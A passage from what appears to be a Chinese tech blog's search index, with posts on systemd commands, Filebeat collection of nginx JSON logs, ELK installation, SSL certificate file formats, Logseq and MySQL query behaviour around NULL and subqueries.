--type=target\n\n# 查看一个 Target 包含的所有 Unit\n$ systemctl list-dependencies multi-user.target\n\n# 查看启动时的默认 Target\n$ systemctl get-default\n\n# 设置启动时的默认 Target\n$ sudo systemctl set-default multi-user.target\n\n# 切换 Target 时，默认不关闭前一个 Target 启动的进程，systemctl isolate 命令改变这种行为，关闭前一个 Target 里面所有不属于后一个 Target 的进程\n$ sudo systemctl isolate multi-user.target\n```\n\n\n\n### 3.4 启动过程\n\n1. 读入 `/boot` 目录下的内核文件\n2. 内核文件加载完之后，开始执行第一个程序`/sbin/init` 初始化进程，由 Systemd 初始化系统引导，完成相关的初始化工作\n3. Systemd 执行`default.target` ，获知设定的启动 target (查看默认 target: `systemctl get-default)`\n4. Systemd 执行启动 target 对应的单元文件。根据单元文件中定义的[依赖关系](https://www.freedesktop.org/software/systemd/man/bootup.html#System Manager Bootup)，传递控制权，依次执行其他 target 单元文件，同时启动每个 target 包含的单元\n\n\n\n# 4. 命令\n\n### 4.1 系统管理命令\n\n`systemctl`是 Systemd 的主命令，用于管理系统。\n\n```bash\n# 重启系统\n$ sudo systemctl reboot\n\n# 关闭系统，切断电源\n$ sudo systemctl poweroff\n\n# CPU停止工作\n$ sudo systemctl halt\n\n# 暂停系统\n$ sudo systemctl suspend\n\n# 让系统进入冬眠状态\n$ sudo systemctl hibernate\n\n# 让系统进入交互式休眠状态\n$ sudo systemctl hybrid-sleep\n\n# 启动进入救援状态（单用户状态）\n$ sudo systemctl rescue\n```\n\n\n\n`systemd-analyze`命令用于查看启动耗时。\n\n```bash\n# 查看启动耗时\n$ systemd-analyze                                                                                       \n\n# 查看每个服务的启动耗时\n$ systemd-analyze blame\n\n# 显示瀑布状的启动过程流\n$ systemd-analyze critical-chain\n\n# 显示指定服务的启动流\n$ systemd-analyze critical-chain atd.service\n```\n\n\n\n### 4.2 查看配置文件\n\n```bash\n# 列出所有配置文件\n# 这个列表显示每个配置文件的状态，一共有四种。\n# enabled：已建立启动链接\n# disabled：没建立启动链接\n# static：该配置文件没有[Install]部分（无法执行），只能作为其他配置文件的依赖\n# masked：该配置文件被禁止建立启动链接\n$ systemctl list-unit-files\n\n# 列出指定类型的配置文件\n$ systemctl list-unit-files --type=service\n\n# 查看当前系统的所有 Target\n$ systemctl list-unit-files --type=target\n```\n\n\n\n### 4.3 查看系统Unit\n\n```bash\n# 列出正在运行的 Unit\n$ systemctl list-units\n\n# 列出所有Unit，包括没有找到配置文件的或者启动失败的\n$ systemctl list-units --all\n\n# 列出所有没有运行的 Unit\n$ systemctl list-units --all --state=inactive\n\n# 列出所有加载失败的 Unit\n$ systemctl list-units --failed\n\n# 列出所有正在运行的、类型为 service 的 Unit\n$ systemctl list-units --type=service\n\n# 查看 Unit 配置文件的内容\n$ systemctl cat docker.service\n```\n\n\n\n### 4.4 查看 Unit 的状态\n\n```bash\n# 显示系统状态\n$ systemctl status\n\n# 显示单个 Unit 的状态\n$ systemctl status bluetooth.service\n\n# 显示远程主机的某个 Unit 的状态\n$ systemctl -H root@levonfly.example.com status httpd.service\n\n# 显示某个 Unit 是否正在运行\n$ systemctl is-active application.service\n\n# 显示某个 Unit 是否处于启动失败状态\n$ systemctl is-failed application.service\n\n# 显示某个 Unit 服务是否建立了启动链接\n$ systemctl is-enabled application.service\n```\n\n\n\n### 4.5 Unit 的管理\n\n```bash\n# 立即启动一个服务\n$ sudo systemctl start apache.service\n\n# 立即停止一个服务\n$ sudo systemctl stop apache.service\n\n# 重启一个服务\n$ sudo systemctl restart apache.service\n\n# 杀死一个服务的所有子进程\n$ sudo systemctl kill apache.service\n\n# 重新加载一个服务的配置文件\n$ sudo systemctl reload apache.service\n\n# 重载所有修改过的配置文件\n$ sudo systemctl daemon-reload\n\n# 显示某个 Unit 的所有底层参数\n$ systemctl show httpd.service\n\n# 显示某个 Unit 的指定属性的值\n$ systemctl show -p CPUShares httpd.service\n\n# 设置某个 Unit 的指定属性\n$ sudo systemctl set-property httpd.service CPUShares=500\n```\n\n\n\n### 4.6 查看 Unit 的依赖关系\n\n```bash\n# 列出一个 Unit 的所有依赖，默认不会列出 target 类型\n$ systemctl list-dependencies nginx.service\n\n# 列出一个 Unit 的所有依赖，包括 target 类型\n$ systemctl list-dependencies --all nginx.service\n```\n\n\n\n### 4.7 服务的生命周期\n\n当一个新的 Unit 文件被放入 /etc/systemd/system/ 或 /usr/lib/systemd/system/ 目录中时，它是不会被自识识别的。\n\n**服务的激活**\n\n- systemctl enable：在 /etc/systemd/system/ 建立服务的符号链接，指向 /usr/lib/systemd/system/ 中\n- systemctl start：依次启动定义在 Unit 文件中的 ExecStartPre、ExecStart 和 ExecStartPost 命令\n\n**服务的启动和停止**\n\n- systemctl start：依次启动定义在 Unit 文件中的 ExecStartPre、ExecStart 和 ExecStartPost 命令\n- systemctl stop：依次停止定义在 Unit 文件中的 ExecStopPre、ExecStop 和 ExecStopPost 命令\n- systemctl restart：重启服务\n- systemctl kill：立即杀死服务\n\n**服务的开机启动和取消**\n\n- systemctl enable：除了激活服务以外，也可以置服务为开机启动\n- systemctl disable：取消服务的开机启动\n\n**服务的修改和移除**\n\n- systemctl daemon-reload：Systemd 会将 Unit 文件的内容写到缓存中，因此当 Unit 文件被更新时，需要告诉 Systemd 重新读取所有的 Unit 文件\n\n- systemctl reset-failed：移除标记为丢失的 Unit 文件。在删除 Unit 文件后，由于缓存的关系，即使通过 daemon-reload 更新了缓存，在 list-units 中依然会显示标记为 not-found 的 Unit。\n\n  \n\n### 4.8 systemctl 与 service 命令的区别\n\n1. systemctl 融合了 service 和 chkconfig 的功能\n2. 在 Ubuntu18.04 中没有自带 chkconfig 命令；service 命令实际上重定向到 systemctl 命令\n\n| 动作                 | SysV Init 指令                 | Systemd 指令                              |\n| -------------------- | ------------------------------ | ----------------------------------------- |\n| 启动某服务           | service httpd start            | systemctl start httpd                     |\n| 停止某服务           | service httpd stop             | systemctl stop httpd                      |\n| 重启某服务           | service httpd restart          | systemctl restart httpd                   |\n| 检查服务状态         | service httpd status           | systemctl status httpd                    |\n| 删除某服务           | chkconfig --del httpd          | 停掉应用，删除其配置文件                  |\n| 使服务开机自启动     | chkconfig --level 5 httpd on   | systemctl enable httpd                    |\n| 使服务开机不自启动   | chkconfig --level 5 httpd off  | systemctl disable httpd                   |\n| 查询服务是否开机自启 | chkconfig --list \\| grep httpd | systemctl is-enabled httpd                |\n| 加入自定义服务       | chkconfig --add test           | systemctl load test                       |\n| 显示所有已启动的服务 | chkconfig --list               | systemctl list-unit-files \\| grep enabled |\n\n\n\n# 5. system 工具集\n\n- systemctl：用于检查和控制各种系统服务和资源的状态\n\n- bootctl：用于查看和管理系统启动分区\n\n- hostnamectl：用于查看和修改系统的主机名和主机信息\n\n  ```bash\n  # 显示当前主机的信息\n  $ hostnamectl\n  \n  # 设置主机名。\n  $ sudo hostnamectl set-hostname levonfly\n  ```\n\n  \n\n- journalctl：用于查看系统日志和各类应用服务日志\n\n- localectl：用于查看和管理系统的地区信息\n\n  ```bash\n  # 查看本地化设置\n  $ localectl\n  \n  # 设置本地化参数。\n  $ sudo localectl set-locale LANG=en_GB.utf8\n  $ sudo localectl set-keymap en_GB\n  ```\n\n  \n\n- loginctl：用于管理系统已登录用户和 Session 的信息\n\n  ```bash\n  # 列出当前session\n  $ loginctl list-sessions\n  \n  # 列出当前登录用户\n  $ loginctl list-users\n  \n  # 列出显示指定用户的信息\n  $ loginctl show-user ruanyf\n  ```\n\n  \n\n- machinectl：用于操作 Systemd 容器\n\n- timedatectl：用于查看和管理系统的时间和时区信息\n\n  ```bash\n  # 查看当前时区设置\n  $ timedatectl\n  \n  # 显示所有可用的时区\n  $ timedatectl list-timezones                                                                                   \n  \n  # 设置当前时区\n  $ sudo timedatectl set-timezone America/New_York\n  $ sudo timedatectl set-time YYYY-MM-DD\n  $ sudo timedatectl set-time HH:MM:SS\n  ```\n\n  \n\n- systemd-analyze 显示此次系统启动时运行每个服务所消耗的时间，可以用于分析系统启动过程中的性能瓶颈\n\n- systemd-ask-password：辅助性工具，用星号屏蔽用户的任意输入，然后返回实际输入的内容\n\n- systemd-cat：用于将其他命令的输出重定向到系统日志\n\n- systemd-cgls：递归地显示指定 CGroup 的继承链\n\n- systemd-cgtop：显示系统当前最耗资源的 CGroup 单元\n\n- systemd-escape：辅助性工具，用于去除指定字符串中不能作为 Unit 文件名的字符\n\n- systemd-hwdb：Systemd 的内部工具，用于更新硬件数据库\n\n- systemd-delta：对比当前系统配置与默认系统配置的差异\n\n- systemd-detect-virt：显示主机的虚拟化类型\n\n- systemd-inhibit：用于强制延迟或禁止系统的关闭、睡眠和待机事件\n\n- systemd-machine-id-setup：Systemd 的内部工具，用于给 Systemd 容器生成 ID\n\n- systemd-notify：Systemd 的内部工具，用于通知服务的状态变化\n\n- systemd-nspawn：用于创建 Systemd 容器\n\n- systemd-path：Systemd 的内部工具，用于显示系统上下文中的各种路径配置\n\n- systemd-run：用于将任意指定的命令包装成一个临时的后台服务运行\n\n- systemd-stdio- bridge：Systemd 的内部 工具，用于将程序的标准输入输出重定向到系统总线\n\n- systemd-tmpfiles：Systemd 的内部工具，用于创建和管理临时文件目录\n\n- systemd-tty-ask-password-agent：用于响应后台服务进程发出的输入密码请求\n\n\n\n# 6. 参考资料\n\n+ https://www.cnblogs.com/usmile/p/13065594.html\n+ https://cloud.tencent.com/developer/article/1516125\n+ http://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-commands.html\n+ http://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-part-two.html\n+ http://www.jinbuguo.com/systemd/systemd.html","tags":["systemctl"],"categories":["命令"]},{"title":"filebeat收集nginx的json格式日志","url":"%2Fp%2Fe36ebda1.html","content":"\n为了便于利用 ELK日志平台收集展示 Nginx 的日志，可以将 Nginx 的日志改成 json 的格式.\n\n<!-- more -->\n\n# 1. 配置\n\n### 1.1 修改 nginx 配置\n\nvim /etc/nginx/nginx.conf \n\n```nginx\n##打开nginx配置文件添加这些信息\n    log_format json '{ \"time_local\": \"$time_local\", '\n                            '\"remote_addr\": \"$remote_addr\", '\n                            '\"referer\": \"$http_referer\", '\n                            '\"request\": \"$request\", '\n                            '\"status\": $status, '\n                            '\"bytes\": $body_bytes_sent, '\n                            '\"agent\": \"$http_user_agent\", '\n                            '\"x_forwarded\": \"$http_x_forwarded_for\", '\n                            '\"up_addr\": \"$upstream_addr\",'\n                            '\"up_host\": \"$upstream_http_host\",'\n                            '\"up_resp_time\": \"$upstream_response_time\",'\n                            '\"request_time\": \"$request_time\"'\n ' }';\n \n##再将日志引用改成json\n     access_log  /var/log/nginx/access.log  json;\n```\n\n\n\n```bash\n > /var/log/nginx/access.log  # 清空日志\n systemctl restart nginx # 重启 nginx\n```\n\n通过浏览器访问, 可以看到 json 输出的日志\n\n### 1.2 修改 filebeat 配置\n\nvim /etc/filebeat/filebeat.yml\n\n```nginx\nfilebeat.inputs:\n- type: log\n  enabled: true\n  paths:\n    - /var/log/nginx/access.log\n  ##添加这两行信息,使其能解析json格式的日志, 和 path 对齐\n  json.keys_under_root: true\n  json.overwrite_keys: true\n\noutput.elasticsearch:\n  hosts: [\"localhost:9200\"]\n```\n\n\n\n### 1.3 filebeat 服务\n\nsudo vi /lib/systemd/system/filebeat.service\n\n```\n[Unit]\nDescription=journalbeat\nAfter=network.target\n\n[Service]\nType=simple\nUser=root\nGroup=root\nRestart=no\nWorkingDirectory=/home/elasticsearch/workspace/filebeat-7.10.1-linux-x86_64/\nExecStart=/home/elasticsearch/workspace/filebeat-7.10.1-linux-x86_64/filebeat\nPrivateTmp=true\n\n[Install]\nWantedBy=multi-user.target\n```\n\nsystemctl start filebeat\n\n\n\n# 2. kinaba查看\n\n### 2.1 创建索引\n\n![1](filebeat收集nginx的json格式日志/1.png)\n![1](filebeat收集nginx的json格式日志/2.png)\n\n\n\n### 2.2 查询\n\n![1](filebeat收集nginx的json格式日志/3.png)\n\n\n\n# 3. 参考资料\n\n+ https://www.jianshu.com/p/b6ba259777e7\n\n","tags":["elk"],"categories":["elk"]},{"title":"elk安装和使用","url":"%2Fp%2F4986eca1.html","content":"\n# 1. 安装\n\n### 1.1 安装elasticsearch\n\n```bash\nwget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.10.1-linux-x86_64.tar.gz\ntar -xzf elasticsearch-7.10.1-linux-x86_64.tar.gz\ncd elasticsearch-7.10.1/bin\n./elasticsearch\n```\n\nMake sure Elasticsearch is up and running\n\n`curl http://127.0.0.1:9200`\n\n<!-- more -->\n\n+ 为了安全不允许 root 启动\n\n  ```bash\n  adduser elasticsearch\n  chown -R elasticsearch:elasticsearch elasticsearch-7.10.1\n  su elasticsearch\n  ```\n\n  \n\n+ could not find java in bundled jdk at\n\n  ```bash\n  apt install default-jre\n  ```\n\n  设置环境变量\n\n  ```bash\n  vi /etc/default/elasticsearch\n  JAVA_HOME=/usr\n  START_DAEMON=true\n  ES_USER=elasticsearch\n  ES_GROUP=elasticsearch\n  \n  export JAVA_HOME=/usr\n  ```\n\n  \n\n### 1.2 安装kibana\n\n```bash\nwget https://mirrors.huaweicloud.com/kibana/7.10.1/kibana-7.10.1-linux-x86_64.tar.gz\ntar xzvf kibana-7.10.1-linux-x86_64.tar.gz\ncd kibana-7.10.1-linux-x86_64/\n./bin/kibana\n```\n\n\n\n+ 访问外网 ip:5601不行\n\n  ```bash\n  vi config/kibana.yml\n  #修改\n  server.host: \"0.0.0.0\"\n  ```\n\n  \n\n### 1.3 安装filebeat\n\n```bash\nwget https://artifacts.elastic.co/downloads/beats/filebeat/filebeat-7.10.1-linux-x86_64.tar.gz\ntar -zxvf filebeat-7.10.1-linux-x86_64.tar.gz\ncd filebeat-7.10.1-linux-x86_64\n```\n\n\n\n收集日志\n\n```bash\nsudo mkdir -p /opt/data/my-app1-log\n```\n\n\n\n编辑`/opt/data/my-app1-log/app.log`并存入以下测试示例日志内容：\n\n```\n2020-10-06 11:40:36.652 INFO http-bio-10009-exec-302 - start someMethod for some params\n2020-10-06 11:40:36.652 INFO http-bio-10009-exec-302 - getUser for someField null,paramId 1111\n2020-10-06 11:40:36.653 DEBUG http-bio-10009-exec-302 - ooo Using Connection [com.alibaba.druid.proxy.jdbc.ConnectionProxyImpl@5f324b3c]\n2020-10-06 11:40:36.653 DEBUG http-bio-10009-exec-302 - ==>  Preparing: select * from t_user where login_name=?\n2020-10-06 11:40:36.653 DEBUG http-bio-10009-exec-302 - ==> Parameters: 18888888888(String)\n2020-10-06 11:40:37.254 INFO http-bio-10009-exec-302 - Filtering response of path: /some/controller/path\n2020-10-06 11:40:37.254 INFO http-bio-10009-exec-308 - Filtering request of path: /some/controller/path\n2020-10-06 11:40:37.254 INFO http-bio-10009-exec-308 - init session with something=<null>,xxxxxxxx,userId=1234\n2020-10-06 11:40:37.254 INFO http-bio-10009-exec-308 - start someMethod for some params\n2020-10-06 11:40:37.255 INFO http-bio-10009-exec-308 - getUser for someField null,paramId 2222\n2020-10-06 11:40:37.255 DEBUG http-bio-10009-exec-308 - ooo Using Connection [com.alibaba.druid.proxy.jdbc.ConnectionProxyImpl@5f324b3c]\n2020-10-06 11:40:37.255 DEBUG http-bio-10009-exec-308 - ==>  Preparing: select * from t_user where login_name=?\n2020-10-06 11:40:37.255 DEBUG http-bio-10009-exec-308 - ==> Parameters: 19999999999(String)\n2020-10-06 11:40:37.262 INFO http-bio-10009-exec-171 - Filtering request of path: /some/controller/path\n2020-10-06 11:40:37.262 INFO http-bio-10009-exec-171 - init session with something=<null>,xxxxxxxx,userId=1256\n2020-10-06 11:40:37.262 INFO http-bio-10009-exec-171 - Filtering response of path: /some/controller/path\n2020-10-06 11:40:37.262 INFO http-bio-10009-exec-308 - Filtering response of path: /another/controller/path\n2020-10-06 11:40:37.263 INFO http-bio-10009-exec-135 - Filtering request of path: /another/controller/path\n2020-10-06 11:40:37.263 INFO http-bio-10009-exec-135 - init session with something=<null>,xxxxxxxx,userId=5678\n2020-10-06 11:40:37.277 DEBUG http-bio-10009-exec-135 - ooo Using Connection [com.alibaba.druid.proxy.jdbc.ConnectionProxyImpl@5f324b3c]\n2020-10-06 11:40:37.277 DEBUG http-bio-10009-exec-135 - ==>  Preparing: select a.* from sometable a where a.user_id = ?\n2020-10-06 11:40:37.277 DEBUG http-bio-10009-exec-135 - ==> Parameters: 5678(Long)\n2020-10-06 11:40:37.277 INFO http-bio-10009-exec-135 - Filtering response of path: /another/controller/path\n```\n\n\n\n配置输入源`vi filebeat.yml`\n\n```ini\n- type: log\n\n  # Change to true to enable this input configuration.\n  enabled: true\n\n  # Paths that should be crawled and fetched. Glob based paths.\n  paths:\n    - /opt/data/my-app1-log/*.log\n```\n\n\n\n启动\n\n```bash\n./filebeat test config -e # 测试配置, 如果没有问题的话最后会输出Config OK字样。\n\n./filebeat -e # 启动\n```\n\n\n\n### 1.4 安装 journalbeat\n\n```bash\ncurl -L -O https://artifacts.elastic.co/downloads/beats/journalbeat/journalbeat-7.10.2-linux-x86_64.tar.gz\ntar xzvf journalbeat-7.10.2-linux-x86_64.tar.gz\n\n\nsudo chown root journalbeat.yml \nsudo ./journalbeat -e\n```\n\n\n\njournalbeat.yml\n\n```bash\ninclude_matches:\n\t- _SYSTEMD_UNIT=lw-music.service\n```\n\n\n\n\n\n# 2. 展示数据\n\n### 2.1 创建索引模式\n\n打开Kibana页面，点击菜单 Management > Stack Management > Index Patterns，然后点击页面上的Create index pattern，在Index pattern输入框中输入filebeat-*关键字，当提示Success! Your index pattern matches 1 index.时，我们点击Next step。\n\n\n\n然后在Time Filter field name下拉列表中选择@timestamp作为时间过滤字段，最后点击Create index pattern按钮，稍等几秒，完成索引模式创建。\n\n### 2.2 查询\n\n点击菜单 Kibana > Discover, 进入查询页面，当前页面默认查询过去15分钟的日志，如果你的页面显示没有查到任何东西，请调整一下时间段，比如将时间改为查找今天，然后就能查到内容了.\n\n![image-20210120170134220](elk%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/image-20210120170134220.png) \n\n\n\n# 3. 创建服务\n\n### 3.1 elasticsearch\n\nsudo vi /lib/systemd/system/elasticsearch.service\n\n```bash\n[Unit]\nDescription=elasticsearch\nAfter=network.target\n[Service]\nType=simple\nUser=elasticsearch\nGroup=elasticsearch\nRestart=no\nExecStart=/home/elasticsearch/workspace/elasticsearch-7.10.1/bin/elasticsearch\nPrivateTmp=true\n[Install]\nWantedBy=multi-user.target\n```\n\nsystemctl start elasticsearch\n\n### 3.2 kibana\n\nsudo vi /lib/systemd/system/kibana.service\n\n```\n[Unit]\nDescription=kibana\nAfter=network.target\n[Service]\nType=simple\nUser=elasticsearch\nGroup=elasticsearch\nRestart=no\nExecStart=/home/elasticsearch/workspace/kibana-7.10.1-linux-x86_64/bin/kibana\nPrivateTmp=true\n[Install]\nWantedBy=multi-user.target\n```\n\nsystemctl start kibana\n\n\n\n### 3.3 journalbeat\n\nsudo vi /lib/systemd/system/journalbeat.service\n\n```\n[Unit]\nDescription=journalbeat\nAfter=network.target\n[Service]\nType=simple\nUser=root\nGroup=root\nRestart=no\nWorkingDirectory=/home/elasticsearch/workspace/journalbeat-7.10.2-linux-x86_64/\nExecStart=/home/elasticsearch/workspace/journalbeat-7.10.2-linux-x86_64/journalbeat\nPrivateTmp=true\n[Install]\nWantedBy=multi-user.target\n```\n\nsystemctl start journalbeat\n\n\n\n# 4. 参考资料\n\n+ https://blog.csdn.net/cloud_xy/article/details/103228810\n+ https://www.elastic.co/guide/en/elastic-stack-get-started/current/get-started-elastic-stack.html\n+ https://www.elastic.co/guide/cn/elasticsearch/guide/current/getting-started.html","tags":["elk"],"categories":["elk"]},{"title":"ssl数字证书后缀","url":"%2Fp%2Ffe1a2c09.html","content":"\n# 0. 概念\n\n### 0.1 HTTPS 通信过程\n\n1. 浏览器向网站服务器请求，服务器把公钥A明文给传输浏览器。\n2. 浏览器随机生成一个用于对称加密的密钥X，用公钥A加密后传给服务器。\n3. 服务器拿到后用私钥A’解密得到密钥X。\n4. 这样双方就都拥有密钥X了，且别人无法知道它。之后双方所有数据都用密钥X 对称加密解密。\n\n<!-- more -->\n\n\n\n### 0.2 中间人攻击\n\n1. 浏览器向网站服务器请求，服务器把公钥A明文给传输浏览器。\n2. 中间人劫持到公钥A，保存下来，把数据包中的公钥A替换成自己伪造的公钥B（它当然也拥有公钥B对应的私钥B’）。\n3. 浏览器随机生成一个用于对称加密的密钥X，用公钥B（浏览器不知道公钥被替换了）加密后传给服务器。\n4. 中间人劫持后用私钥B’解密得到密钥X，再用公钥A加密后传给服务器。\n5. 服务器拿到后用私钥A’解密得到密钥X。\n\n根本原因是浏览器无法确认自己收到的公钥是不是网站自己的。\n\n### 0.3 数字证书\n\n网站在使用HTTPS前，需要向“CA机构”申请颁发一份数字证书，数字证书里有证书持有者、证书持有者的公钥等信息，服务器把证书传输给浏览器，浏览器从证书里取公钥就行了，证书就如身份证一样，可以证明“该公钥对应该网站”。\n\n> 实际上，数字证书就是经过CA认证过的公钥。\n\n### 0.4 数字签名\n\n如何防止数字证书被篡改? 我们把证书内容生成一份“签名”，比对证书内容和签名是否一致就能察觉是否被篡改。这种技术就叫数字签名\n\n1. CA拥有非对称加密的私钥和公钥。\n2. CA对证书明文信息进行hash。\n3. 对hash后的值用私钥加密，得到数字签名。\n\n浏览器验证过程：\n\n1. 拿到证书，得到明文T，数字签名S。\n2. 用CA机构的公钥对S解密（由于是浏览器信任的机构，所以浏览器保有它的公钥。），得到S’。\n3. 用证书里说明的hash算法对明文T进行hash得到T’。\n4. 比较S’是否等于T’，等于则表明证书可信。\n\n\n\n# 1. PKCS\n\nPKCS 全称是 Public-Key Cryptography Standards ，是由 RSA 实验室与其它安全系统开发商为促进公钥密码的发展而制订的一系列标准，PKCS 目前共发布过 15 个标准。 \n\n### 1.1 PKCS#7 \n\nPKCS#7 cert request response: .p7r 是CA对证书请求的回复，只用于导入\nPKCS#7 binary message: .p7b 以树状展示证书链(certificate chain)，同时也支持单个证书，不含私钥\n\n### 1.2 PKCS#10 \n\nCertification Request: .p10 证书请求\n\n### 1.3 PKCS#12 \n\nPersonal Information Exchange: .pfx, .p12 用于存放个人证书/私钥，他通常包含保护密码，2进制方式\n\n### 1.4 X.509\n\nX.509是常见通用的证书格式。所有的证书都符合为Public Key Infrastructure (PKI) 制定的 ITU-T X509 国际标准。\n\nX.509 der 编码(ASCII)的后缀是： .DER .CER .CRT\n\nX.509 pem 编码(Base64)的后缀是： .PEM .CER .CRT\n\n\n\n# 2. 证书后缀\n\n### 2.1 *.der 证书\n\n扩展名der用于二进制DER编码的证书。这些证书也可以用cer或者crt作为扩展名。比较合适的说法是“我有一个der编码的证书”，而不是“我有一个der证书”。\n\nJava和Windows服务器偏向于使用这种编码格式。\n\n### 2.2 *.pem base64证书或密钥\n\nPrivacy Enhanced Mail，证书或密钥的Base64文本存储格式，可以单独存放证书或密钥，也可以同时存放证书或密钥。\n\n打开看文本格式,以”—–BEGIN…”开头, “—–END…”结尾,内容是BASE64编码。\n\n一般 Apache 和 Nginx 服务器应用偏向于使用 PEM 这种编码格式。\n\n### 2.3 *.cer *.crt 二进制证书\n\n.cer/.crt是用于存放证书，它是2进制形式存放的，不含私钥。 \n\n证书可以是DER编码，也可以是PEM编码。\n\nwindows下叫cer，linux下叫crt。 \n\n### 2.4 pkcs1-pkcs12\n\n公钥加密(非对称加密)的一种标准(Pbulic Key Cryptography Standards),一般存储为`*.pn，*.p12`是包含证书和密钥的封装格式。\n\nPKCS 全称是 Public-Key Cryptography Standards ，是由 RSA 实验室与其它安全系统开发商为促进公钥密码的发展而制订的一系列标准，PKCS 目前共发布过 15 个标准。\n\n### 2.5 *.key\n\n单独存放的pem格式的密钥，一般保存为*.key。\n\n### 2.6 *.csr\n\n证书签名请求(Certificate sign request)，包含证书持有人的信息，如国家，邮件，域名等。\n\n### 2.7 *.pfx\n\n微软iis的实现。用于存放个人证书/私钥，通常包含保护密码，2进制方式\n\n### 2.8 *.jks\n\njks是Java密钥库(KeyStore)比较常见的一种格式。一般可用通过cer 或者pem 格式的证书以及私钥的进行转化为jks格式，有密码保护。所以它是带有私钥的证书文件，一般用户tomcat环境的安装。\n\n### 2.9 *.crl\n\n证书吊销列表(Certificate Revocation List)。\n\n\n\n# 3. 参考资料:\n\n+ https://www.codeleading.com/article/36513493623/\n","tags":["ssl"],"categories":["https"]},{"title":"logseq笔记的使用","url":"%2Fp%2F2b1e388d.html","content":"\n# 1. 介绍\n\n这是一款由国人开发的支持双向链接的大纲笔记软件，如果你对 Roam Research 有所耳闻，想找一款基础用法大差不差的平替，Logseq 会是目前市面上最好的选择之一。\n\n它现在 Beta 阶段的主要功能包括现在及以后都将永久免费，这意味着体验它无需成本。它秉承隐私至上的理念，你可以完全离线使用它，所有文档将以 Markdown 格式存储在本地，任何一款文本编辑器都可以打开。\n\n<!-- more -->\n\n# 2. 插件\n\n\n![1](logseq%E7%AC%94%E8%AE%B0%E7%9A%84%E4%BD%BF%E7%94%A8/1.jpg)\n![2](logseq%E7%AC%94%E8%AE%B0%E7%9A%84%E4%BD%BF%E7%94%A8/2.jpg)\n\n### 2.1 Tabs设置\n\n+ cmd+w 关闭\n+ 系统设置，把 close window 给改掉。\n\n\n\n# 3. 主题\n![3](logseq%E7%AC%94%E8%AE%B0%E7%9A%84%E4%BD%BF%E7%94%A8/3.jpg)\n\n- Laurel theme 分块\n- Textbook theme 左对齐\n- Woz theme 护眼\n","tags":["logseq"],"categories":["笔记"]},{"title":"mysql查询知识","url":"%2Fp%2F899b978d.html","content":"\n# 1. 关键词\n\n### 1.1 union 和  union all 区别\n\nUNION removes duplicate records (where all columns in the results are the same)\n\nUNION ALL does not.\n\n<!-- more -->\n\n### 1.2 distinct的用法\n\n语法:\n\n```sql\nSELECT DISTINCT column_name,column_name FROM table_name; -- 对后面所有的列, 共同起效果\n```\n\n**1.2.1 group by 和 distinct 的区别**\n\nGROUP BY lets you use aggregate functions, like AVG, MAX, MIN, SUM, and COUNT. \n\nOn the other hand DISTINCT just removes duplicates.\n\n如果想达到同样效果, 可以用distinct, 因为更快一些.\n\n\n\n# 2. NULL\n\n### 2.1 is null 和  is not null\n\n语法:\n\n```sql\nSELECT column_names FROM table_name WHERE column_name IS NULL;\nSELECT column_names FROM table_name WHERE column_name IS NOT NULL;\n```\n\n\n\n判断一个字符串是否为空字符串?\n\n```sql\nSelect * From Table Where (col is null or col = '')\n```\n\n\n\n### 2.2 not in 和 null 的结合\n\n> SQL uses three valued logic: true, false, and unknown. A comparison with null results in unknown, which is not true\n\n创建表:\n\n```sql\nCREATE TABLE pony\n(\nid INT PRIMARY KEY,\nname VARCHAR(255)\n);\n\nINSERT INTO pony (id, name)\nVALUES\n(1, ‘Twilight Sparkle’),\n(2, ‘Rainbow Dash’),\n(3, ‘Pinkie Pie’),\n(4, ‘Rarity’),\n(5, ‘Applejack’);\n```\n\n\n\n**注意 NULL 不能直接 !=** \n\n```sql\nSELECT * FROM pony;\n— 5 rows as expected\n\nSELECT * FROM pony WHERE id = NULL;\n— 0 rows as expected\n\nSELECT * FROM pony WHERE id != NULL;\n— 0 rows, slight wtf\n\nSELECT * FROM pony WHERE id IS NOT NULL;\n— 5 rows as expected\n```\n\n\n\n**NULL still works intuitively when using WHERE IN:**\n\n```sql\nSELECT * FROM pony WHERE id IN (1, 2, NULL);\n— 2 rows as expected\n\n— equivalent statement:\n\nSELECT * FROM pony\nWHERE id = 1\nOR id = 2\nOR id = null;\n```\n\n\n\n**WHERE NOT IN is where things get tricky:**\n\n```sql\nSELECT * FROM pony\nWHERE id NOT IN (1, 2, NULL);\n— 0 rows, major wtf\n\n\nSELECT * FROM pony\nWHERE id != 1\nAND id != 2\nAND id != NULL;\n```\n\nLike explained in the intro, id != NULL is always unknown, therefor the entire WHERE clause is always FALSE.\n\n\n\n\n\n# 3. 子查询\n\nSQL子查询可以分为相关子查询和非相关子查询两类。\n\n### 3.1 非相关子查询\n\n非相关子查询的执行不依赖与外部的查询。非相关子查询一般可以分为：返回单值的子查询和返回一个列表的子查询。\n\n执行过程：\n（1）执行子查询，其结果不被显示，而是传递给外部查询，作为外部查询的条件使用。\n（2）执行外部查询，并显示整个结果。　　\n\n**3.1.1 返回单值：**\n查询所有价格高于平均价格的图书名，作者，出版社和价格。\n\n```sql\nSElECT 图书名，作者，出版社，价格\n  FROM Books\n  WHERE 价格 >\n  (\n    SELECT AVG(价格)\n    FROM Books\n  )\n```\n\n**3.1.2 返回值列表:**\n\n```sql\n查询所有借阅图书的读者信息\nSElECT *\n  FROM Readers\n  WHERE 读者编号 IN\n  (\n    SELECT 读者编号\n    FROM [Borrow History]\n  )\n```\n\n\n\n### 3.2 相关子查询\n\n相关子查询的执行依赖于外部查询, 相关子查询无法独立于外部查询而得到解决。\n\n执行过程：\n（1）从外层查询中取出一个元组，将元组相关列的值传给内层查询。\n（2）执行内层查询，得到子查询操作的值。\n（3）外查询根据子查询返回的结果或结果集得到满足条件的行。\n（4）然后外层查询取出下一个元组重复做步骤1-3，直到外层的元组全部处理完毕。 　　\n\n\n\n查询Books表中大于该类图书价格平均值的图书信息\n\n```sql\nSELECT 图书名，作者，出版社，价格 FROM Books As a\n  WHERE 价格 >\n  (\n    SELECT AVG(价格)\n    FROM Books AS b\n    WHERE a.类编号=b.类编号\n  )\n```\n\n### 3.3 总结\n\n非相关子查询是独立于外部查询的子查询，子查询总共执行一次，执行完毕后将值传递给外部查询。\n相关子查询的执行依赖于外部查询的数据，外部查询执行一行，子查询就执行一次。\n故非相关子查询比相关子查询效率高。\n\n\n\n# 4. in 和 exist\n\n### 4.1 in\n\n语法:\n\n```sql\nSELECT 